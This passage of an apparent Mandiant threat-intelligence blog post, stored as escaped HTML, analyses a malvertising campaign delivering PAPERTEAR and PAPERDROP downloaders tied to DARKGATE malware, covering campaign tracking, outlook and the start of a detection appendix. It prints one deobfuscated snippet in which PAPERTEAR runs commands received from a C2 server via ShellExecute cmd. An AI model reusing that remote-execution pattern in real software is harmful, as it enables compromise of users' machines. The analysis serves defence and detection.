elementary.\u003c/p\u003e"]]],[null,null,null,null,null,null,null,null,[[[null,"\u003cp\u003eFigure 16: PAPERTEAR source code, HTTP functionality, code comments sourced from a Sherlock Holmes novel\u003c/p\u003e"],["https://storage.googleapis.com/gweb-cloudblog-publish/images/whoop-ads-fig17.max-1100x1100.png",null,null,"https://storage.googleapis.com/gweb-cloudblog-publish/images/whoop-ads-fig17.max-1100x1100.png"],null,3]]],[null,null,[null,[null,"\u003cp\u003eFrom there, PAPERTEAR will then parse the HTTP response from the C2 server and directly execute its contents on the host via \u003ca href\u003d\"https://learn.microsoft.com/en-us/windows/win32/shell/launch\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cu\u003eShellExecute\u003c/u\u003e\u003c/a\u003e. With the limited obfuscation removed, the crucial snippet of code from Figure 16 that performs this function would otherwise appear as:\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eCreateObect(\u0026quot;Shell Application\u0026quot;).ShellExecute \u0026quot;cmd\u0026quot;,\u0026quot;\u0026lt;variable with http response from c2 containing arbitrary command\u0026gt;\u0026quot;,\u0026quot;\u0026quot;,\u0026quot;\u0026quot;,0\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis is the core differentiator between PAPERTEAR and PAPERDROP. While PAPERTEAR executes commands directly from the HTTP response it receives, PAPERDROP writes the contents of the HTTP response to disk prior to executing additional steps in its infection chain. PAPERTEAR is primarily associated with the distribution of DARKGATE payloads and is suspected to be integrated directly into the DARKGATE malware build process.\u003c/p\u003e\n\u003ch2\u003eCampaign Tracking \u003c/h2\u003e\n\u003cp\u003eMandiant has been disseminating intelligence on UNC2975’s campaign within \u003ca href\u003d\"https://cloud.google.com/security/products/threat-intelligence\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cu\u003eMandiant Advantage\u003c/u\u003e\u003c/a\u003e, providing our customers with notable and dynamic updates regarding changes in tactics and techniques, the introduction of tools with new capabilities, and the use of new infrastructure UNC2975 has used to carry out its mission. \u003c/p\u003e\n\u003cp\u003eMandiant tracks separate campaigns for each distribution method or actors delivering the Malware-as-a-Service backdoor DARKGATE. To differentiate between the initial malware distribution, DARKGATE infrastructure, and follow-on activity, Mandiant tracks each part of the intrusion as separate clusters until further overlaps are identified and warrant merging. Mandiant tracks the DARKGATE Malware-as-a-Service infrastructure and associated payloads as UNC5085 while separately clustering the different distribution methods and any follow-on actors.\u003c/p\u003e\n\u003cp\u003eSee our previous blog post for more insights into how Mandiant can help \u003ca href\u003d\"https://www.mandiant.com/resources/blog/attacker-visibility-threat-campaigns\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cu\u003eGain Visibility Into Attacker Activity with Threat Campaigns\u003c/u\u003e\u003c/a\u003e. DARKGATE Access to Deploy BASTA Ransomware\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"width:18.7166%\"\u003e\n\u003cp\u003eUNC2500 (Distribution)\u003c/p\u003e\n\u003cp\u003eUNC4393 (Follow-on)\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e \u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003ch2\u003eOutlook and Implications\u003c/h2\u003e\n\u003cp\u003eIn M-Trends 2023, the three most common initial access techniques Mandiant observed related to workstation compromise were phishing [\u003ca href\u003d\"https://attack.mitre.org/techniques/T1566/\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cu\u003eT1566\u003c/u\u003e\u003c/a\u003e], drive-by compromise [\u003ca href\u003d\"https://attack.mitre.org/techniques/T1189/\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cu\u003eT1189\u003c/u\u003e\u003c/a\u003e], and replication through removable media [\u003ca href\u003d\"https://attack.mitre.org/techniques/T1091/\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cu\u003eT1091\u003c/u\u003e\u003c/a\u003e]. Within the category of drive-by compromise, Mandiant has observed an increase from 2022 to 2023 in the number of investigations involving malicious advertisements where the initial infection vector was able to be identified. More broadly, in 2022 alone, Google removed over \u003ca href\u003d\"https://blog.google/products/ads-commerce/our-2022-ads-safety-report/\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cu\u003e5.2 billion ads, restricted over 4.3 billion ads and suspended over 6.7 million\u003c/u\u003e\u003c/a\u003e advertiser accounts. While it is unlikely that malvertising will cease to be a viable attack vector for threat actors, maintaining a level of response readiness when such threats are identified is key to being able to neutralize campaigns in their early stages. In this case, Mandiant Managed Defense, in partnership with Mandiant Intelligence and the Google Ads team, was successfully able to protect users on a granular host-based level as well as at a global scale across the Google ecosystem.\u003c/p\u003e\n\u003cp\u003eMandiant’s Managed Defense threat hunting team focuses on identifying behaviors associated with threat actors and endpoint compromises, especially those that don’t typically generate product-based alerts. By focusing on behavioral indicators, we can identify evidence of different types of compromise, such as \u003ca href\u003d\"https://cloud.google.com/blog/topics/threat-intelligence/china-nexus-espionage-southeast-asia\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cu\u003emalware execution\u003c/u\u003e\u003c/a\u003e or a threat actor profiling an environment using \u003ca href\u003d\"https://cloud.google.com/blog/topics/threat-intelligence/unc961-multiverse-financially-motivated\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cu\u003ediscovery commands\u003c/u\u003e\u003c/a\u003e. Like all security analysts, when we identify evidence of compromise, we analyze the data to try to answer the question: “How was the system initially compromised?” Performing a deeper dive to identify the initial infection vector and related timeline events provides two benefits: [1] the ability to identify campaigns through repeated use of infrastructure and indicators and [2] additional malware or behavioral artifacts that can be used to create or expand existing detections, event correlations, and threat hunting missions. The Detection Opportunities section of this blog post includes commands and artifacts that Mandiant discovered beyond the initial detection events that were used to create additional signatures to identify future activity faster.\u003c/p\u003e\n\u003ch2\u003eAppendix A: Detection Opportunities\u003c/h2\u003e\n\u003cp\u003eSecurity analysts can use the following events as input for testing new
